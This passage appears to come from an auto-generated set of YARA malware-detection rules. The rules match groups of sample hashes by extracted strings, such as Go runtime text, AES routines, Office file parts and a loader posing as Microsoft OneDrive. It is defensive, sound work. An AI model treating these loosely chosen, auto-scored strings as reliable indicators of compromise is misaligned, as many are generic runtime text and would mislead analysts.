      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash5 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash6 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash7 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "bad defer entry in panicbad defer size class: i=bypassed recovery failedcan't scan our own stackconnection reset by peerdouble t" ascii /* score: '22.00'*/
      $s2 = "runtime: bad pointer in frame runtime: found in object at *(runtime: impossible type kind socket operation on non-socketsync: in" ascii /* score: '18.00'*/
      $s3 = "runtime: bad pointer in frame runtime: found in object at *(runtime: impossible type kind socket operation on non-socketsync: in" ascii /* score: '15.00'*/
      $s4 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '13.00'*/
      $s5 = "consistent mutex statesync: unlock of unlocked mutex) not in usable address space: ...additional frames elided..." fullword ascii /* score: '10.00'*/
      $s6 = "IsNilreflect.Value.Sliceruntime: g0 stack [runtime: pcdata is runtime: preempt g0semaRoot rotateLeftskip this directorystopm hol" ascii /* score: '10.00'*/
      $s7 = "ault address unexpected key value type using unaddressable value1455191522836685180664062572759576141834259033203125Bougainville" ascii /* score: '7.00'*/
      $s8 = "os.isWindowsNulName" fullword ascii /* score: '4.00'*/
      $s9 = "TEDTEETEOFESTGMTHDTHSTHanIDTISTJSTKSTLaoMDTMSKMSTMayMroNDTNSTNULNaNNkoPC=PDTPKTPSTStdUTCVaiWAT\\\\?]:" fullword ascii /* score: '4.00'*/
      $s10 = "0123456789ABCDEF0123456789abcdef2384185791015625C" ascii /* score: '4.00'*/
      $s11 = " lockedg= lockedm= m->curg= marked   ms cpu,  not in [ runtime= s.limit= s.state= threads= u_a/u_g= unmarked wbuf1.n= wbuf2.n=(u" ascii /* score: '2.00'*/
      $s12 = "1907348632812595367431640625Ce" ascii /* score: '1.00'*/
      $s13 = "e173472347597680709441192448139190673828125867361737988403547205962240695953369140625" ascii /* score: '1.00'*/
      $s14 = "e363797880709171295166015625Ce" ascii /* score: '1.00'*/
      $s15 = "19531259765625A" ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966_78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bd_59 {
   meta:
      description = "dataset - from files 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash2 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash3 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash4 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "os.(*fileStat).Sys" fullword ascii /* score: '19.00'*/
      $s2 = "crypto/aes.encryptBlockGo" fullword ascii /* score: '9.00'*/
      $s3 = "crypto/aes.(*aesCipherAsm).Encrypt" fullword ascii /* score: '9.00'*/
      $s4 = "crypto/aes.(*aesCipher).Encrypt" fullword ascii /* score: '9.00'*/
      $s5 = "crypto/aes.(*aesCipherGCM).Encrypt" fullword ascii /* score: '9.00'*/
      $s6 = "crypto/aes.encryptBlockAsm" fullword ascii /* score: '9.00'*/
      $s7 = "os.(*fileStat).Name" fullword ascii /* score: '4.00'*/
      $s8 = "reflect.(*ptrType).NumField" fullword ascii /* score: '4.00'*/
      $s9 = "os.(*fileStat).isSymlink" fullword ascii /* score: '4.00'*/
      $s10 = "os.(*fileStat).Mode" fullword ascii /* score: '4.00'*/
      $s11 = "reflect.(*ptrType).Size" fullword ascii /* score: '4.00'*/
      $s12 = "os.(*fileStat).ModTime" fullword ascii /* score: '4.00'*/
      $s13 = "os.(*fileStat).IsDir" fullword ascii /* score: '4.00'*/
      $s14 = "syscall.(*Filetime).Nanoseconds" fullword ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1e993ef7ee5f21b9f815ebf853b0bd40d3328a1bd6d680ffc3ace55e4bf73a89_9d35e17421e9a1c8458f32cd813bd27f_c90860cbcc78e518dfc11584e_60 {
   meta:
      description = "dataset - from files 1e993ef7ee5f21b9f815ebf853b0bd40d3328a1bd6d680ffc3ace55e4bf73a89, 9d35e17421e9a1c8458f32cd813bd27f, c90860cbcc78e518dfc11584eb096b7d31eb488f43d5c082b816da54cddfae0f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "1e993ef7ee5f21b9f815ebf853b0bd40d3328a1bd6d680ffc3ace55e4bf73a89"
      hash2 = "910e449d025890cc10c331f41de133f6865bb8fbe66facafec461b121e9aef1d"
      hash3 = "c90860cbcc78e518dfc11584eb096b7d31eb488f43d5c082b816da54cddfae0f"
   strings:
      $s1 = "DocumentSummaryInformation" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.96'*/ /* Goodware String - occured 41 times */
      $s2 = "Root Entry" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 46 times */
      $s3 = "SummaryInformation" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 50 times */
      $s4 = "Calibri1" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "theme/theme/themeManager.xml" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s6 = "theme/theme/_rels/themeManager.xml.relsPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s7 = "theme/theme/_rels/themeManager.xml.rels" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s8 = "K(M&$R(.1" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s9 = "theme/theme/theme1.xml" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s10 = "theme/theme/themeManager.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s11 = "theme/theme/theme1.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s12 = "Microsoft Excel" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343_a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae188790_61 {
   meta:
      description = "dataset - from files 0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343, a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b, d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
      hash2 = "a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b"
      hash3 = "d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
   strings:
      $s1 = "get_PictureBox2" fullword ascii /* score: '9.00'*/
      $s2 = "get_PictureBox1" fullword ascii /* score: '9.00'*/
      $s3 = "PictureBox1" fullword wide /* score: '5.00'*/
      $s4 = "PictureBox2" fullword wide /* score: '5.00'*/
      $s5 = "set_PictureBox1" fullword ascii /* score: '4.00'*/
      $s6 = "set_PictureBox2" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_62 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash5 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
   strings:
      $s1 = "time.Time.Day" fullword ascii /* score: '10.00'*/
      $s2 = "rno= mheap.sweepgen= not in ranges:" fullword ascii /* score: '9.00'*/
      $s3 = "time.Time.Month" fullword ascii /* score: '7.00'*/
      $s4 = "time.Time.Second" fullword ascii /* score: '7.00'*/
      $s5 = "time.Time.Minute" fullword ascii /* score: '7.00'*/
      $s6 = "time.Time.Hour" fullword ascii /* score: '7.00'*/
      $s7 = "time.quote" fullword ascii /* score: '7.00'*/
      $s8 = " method:L" fullword ascii /* score: '4.00'*/
      $s9 = "time.Time.Location" fullword ascii /* score: '3.00'*/
      $s10 = "*[15]uint64" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( all of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5_63 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
   strings:
      $x1 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Call to VirtualProtect failed!!Cent" ascii /* score: '64.50'*/
      $s2 = "loader/OneDrive.go" fullword ascii /* score: '13.00'*/
      $s3 = " 9too many Questions to pack (>65535)traceback did not unwind completelytransport endpoint is not connected) is larger than maxi" ascii /* score: '10.00'*/
      $s4 = "mum page size () is not Grunnable or Gscanrunnable" fullword ascii /* score: '8.00'*/
      $s5 = "ard TimeBuildSecurityDescriptorWCape Verde Standard TimeCertFreeCertificateChainCreateToolhelp32SnapshotGenerateConsoleCtrlEvent" ascii /* score: '6.00'*/
      $s6 = "P has non-empty run queueruntime: close polldesc w/o unblockruntime: createevent failed; errno=ryuFtoaFixed32 called with prec >" ascii /* score: '6.00'*/
      $s7 = " invalid freenetwork dropped connection on resetno such multicast network interfacepersistentalloc: align is too largepidleput: " ascii /* score: '5.00'*/
      $s8 = "Microsoft OneDrive" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s9 = "OneDrive.exe" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "20.114.0607.0002" fullword wide /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f_bb4fe58a0d6cbb1237d46f2952d762cc_f3ba7589f1ca3fb4c27934e45_64 {
   meta:
      description = "dataset - from files 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f, bb4fe58a0d6cbb1237d46f2952d762cc, f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0, 1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f, b0357ebcaa97a8f10ca5d940af9e5a2fb9675551956f6d58a2104899d53274ff, 7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618, 5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9, ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330, 2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03, 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b, 2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43, ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      hash2 = "56f3f593d4bf728840e00df5ba1a1fe1ffddf142a3e42dac6023c866d3670624"
      hash3 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      hash4 = "1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f"
      hash5 = "b0357ebcaa97a8f10ca5d940af9e5a2fb9675551956f6d58a2104899d53274ff"
      hash6 = "7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618"
      hash7 = "5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9"
      hash8 = "ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330"
      hash9 = "2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03"
      hash10 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      hash11 = "2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43"
      hash12 = "ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c"
   strings:
      $s1 = "D!l$xA" fullword ascii /* score: '1.00'*/
      $s2 = "L$ |+L;" fullword ascii /* score: '1.00'*/
      $s3 = "H97u+A" fullword ascii /* score: '1.00'*/
      $s4 = "ue!T$(H!T$ " fullword ascii /* score: '1.00'*/
      $s5 = "L$&8\\$&t,8Y" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( all of them )
      ) or ( all of them )
}

rule _7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9_78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bd_65 {
   meta:
      description = "dataset - from files 7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9"
      hash2 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash3 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
   strings:
      $s1 = "syscall.(*DLL).MustFindProc" fullword ascii /* score: '5.00'*/
      $s2 = "shutdown" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.74'*/ /* Goodware String - occured 262 times */
      $s3 = "*map.bucket[string]uint64" fullword ascii /* score: '4.00'*/
      $s4 = "*map[string]uint64" fullword ascii /* score: '4.00'*/
      $s5 = "syscall.Exit" fullword ascii /* score: '3.00'*/
      $s6 = "*[14]uint8" fullword ascii /* score: '1.00'*/
      $s7 = "*[128]uint8" fullword ascii /* score: '1.00'*/
      $s8 = "*[8]uint64" fullword ascii /* score: '1.00'*/
      $s9 = "*[3]uint32" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( all of them )
      ) or ( all of them )
}

rule _7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243_e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920_66 {
   meta:
      description = "dataset - from files 7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243, e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243"
      hash2 = "e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076"
   strings:
      $s1 = "MAZOWIECKIE1" fullword ascii /* score: '5.00'*/
      $s2 = "Warszawa1" fullword ascii /* score: '5.00'*/
      $s3 = "PL-00001888680" fullword ascii /* score: '1.00'*/
      $s4 = "211129235959" ascii /* score: '1.00'*/
      $s5 = "00001888681" ascii /* score: '1.00'*/
      $s6 = "Y`CUzD]" fullword ascii /* score: '1.00'*/
      $s7 = "211129235959Z0" fullword ascii /* score: '1.00'*/
      $s8 = "201202000000Z" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( all of them )
      ) or ( all of them )
}

rule _dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9_0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732d_67 {
   meta:
      description = "dataset - from files dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9, 0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343, a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b, d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9"
      hash2 = "0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
      hash3 = "a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b"
      hash4 = "d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
   strings:
      $s1 = "get_Label3" fullword ascii /* score: '6.00'*/
      $s2 = "CompareString" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 28 times */
      $s3 = "get_Label1" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s4 = "Label3" fullword wide /* score: '2.00'*/
      $s5 = "set_Label3" fullword ascii /* score: '1.00'*/
      $s6 = "set_Label1" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83_9af4b3b8c67d21fef69dee132cb686d1cb9e34e2d5e807b05c2a92e48f_68 {
   meta:
      description = "dataset - from files 7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83, 9af4b3b8c67d21fef69dee132cb686d1cb9e34e2d5e807b05c2a92e48f08dd39, 923de5fc24a860522375e93ea09e4298e5a1dfaa6a17c61754162aa3d4339bce, 32fc03caa22bc3bbf778b04da675e528dd7125a61da6f9fc5e532230745bcd8c, 956e66f820c127b655c4e59af455c4cc827d43b111f4cf260b6da1d30ac443b2"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83"
      hash2 = "9af4b3b8c67d21fef69dee132cb686d1cb9e34e2d5e807b05c2a92e48f08dd39"
      hash3 = "923de5fc24a860522375e93ea09e4298e5a1dfaa6a17c61754162aa3d4339bce"
      hash4 = "32fc03caa22bc3bbf778b04da675e528dd7125a61da6f9fc5e532230745bcd8c"
      hash5 = "956e66f820c127b655c4e59af455c4cc827d43b111f4cf260b6da1d30ac443b2"
   strings:
      $s1 = "self.exe" fullword wide /* score: '22.00'*/
      $s2 = " testapp.exe" fullword wide /* score: '19.00'*/
      $s3 = "CHENGDU YIWO Tech Development Co., Ltd (YIWO Tech Ltd, for short)." fullword wide /* score: '6.00'*/
      $s4 = "Copyright (c)2006-2008 CHENGDU YIWO Tech Development Co., Ltd." fullword wide /* score: '6.00'*/
      $s5 = ".m5Fih" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( all of them )
      ) or ( all of them )
}

rule _d120e20c7e868c1ce1b94ed63318be6d_7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618_69 {
   meta:
      description = "dataset - from files d120e20c7e868c1ce1b94ed63318be6d, 7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "942a315f52b49601cb8a2080fa318268f7a670194f9c5be108d936db32affd52"
      hash2 = "7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "      <!--The ID below indicates application support for Windows 10 -->" fullword ascii /* score: '7.00'*/
      $s3 = "      <!--The ID below indicates application support for Windows Vista -->" fullword ascii /* score: '7.00'*/
      $s4 = "      <!--The ID below indicates application support for Windows 7 -->" fullword ascii /* score: '7.00'*/
      $s5 = "      <!--The ID below indicates application support for Windows 8 -->" fullword ascii /* score: '7.00'*/
      $s6 = "      <!--The ID below indicates application support for Windows 8.1 -->" fullword ascii /* score: '7.00'*/
      $s7 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " fullword ascii /* score: '2.00'*/
      $s8 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " fullword ascii /* score: '2.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( all of them )
      ) or ( all of them )
}

rule _7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966_89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3_70 {
   meta:
      description = "dataset - from files 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash2 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash3 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '8.00'*/
      $s2 = "plements" fullword ascii /* score: '8.00'*/
      $s3 = "ype name: reflect.Value.Slice: slice index out of boundsreflect: nil type passed to Type.ConvertibleToreleased less than one phy" ascii /* score: '7.00'*/
      $s4 = "ot sorted by program counter: reflect.Value.Slice: string slice index out of boundsreflect: non-interface type passed to Type.Im" ascii /* score: '7.00'*/
      $s5 = "sical page of memoryruntime: failed to create new OS thread (have runtime: name offset base pointer out of rangeruntime: panic b" ascii /* score: '6.00'*/
      $s6 = "efore malloc heap initialized" fullword ascii /* score: '6.00'*/
      $s7 = "span set block with unpopped elements found in resetcompileCallback: argument size is larger than uintptrfunction symbol table n" ascii /* score: '6.00'*/
      $s8 = "<\\t=</t9<.u" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( all of them )
      ) or ( all of them )
}

rule _82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f_bb4fe58a0d6cbb1237d46f2952d762cc_f3ba7589f1ca3fb4c27934e45_71 {
   meta:
      description = "dataset - from files 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f, bb4fe58a0d6cbb1237d46f2952d762cc, f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0, 1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f, 5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9, 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b, 2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      hash2 = "56f3f593d4bf728840e00df5ba1a1fe1ffddf142a3e42dac6023c866d3670624"
      hash3 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      hash4 = "1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f"
      hash5 = "5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9"
      hash6 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      hash7 = "2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43"
   strings:
      $s1 = "<utT@:" fullword ascii /* score: '1.00'*/
      $s2 = "<g~{<itd<ntY<ot7<pt" fullword ascii /* score: '1.00'*/
      $s3 = "<StW@:" fullword ascii /* score: '1.00'*/
      $s4 = "D<P0@:" fullword ascii /* score: '1.00'*/
      $s5 = "<Ct-<D" fullword ascii /* score: '1.00'*/
      $s6 = "<htl<jt\\<lt4<tt$<wt" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95_88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c_72 {
   meta:
      description = "dataset - from files 12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95, 88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502, c977b861b887a09979d4e1ef03d5f975f297882c30be38aba59251f1b46c2aa8, dd088962eb9e2a6b6e10114d4aecad1b20ca033f6eba1308eb6c0fcd9905cbee"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95"
      hash2 = "88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
      hash3 = "c977b861b887a09979d4e1ef03d5f975f297882c30be38aba59251f1b46c2aa8"
      hash4 = "dd088962eb9e2a6b6e10114d4aecad1b20ca033f6eba1308eb6c0fcd9905cbee"
   strings:
      $s1 = "word/theme/theme1.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s2 = "word/document.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s3 = "word/styles.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s4 = "word/fontTable.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s5 = "word/_rels/document.xml.relsPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s6 = "word/webSettings.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s7 = "word/settings.xmlPK" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x4b50 and filesize < 14000KB and ( all of them )
      ) or ( all of them )
}

rule _88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502_c977b861b887a09979d4e1ef03d5f975f297882c30be38aba59251f1b4_73 {
   meta:
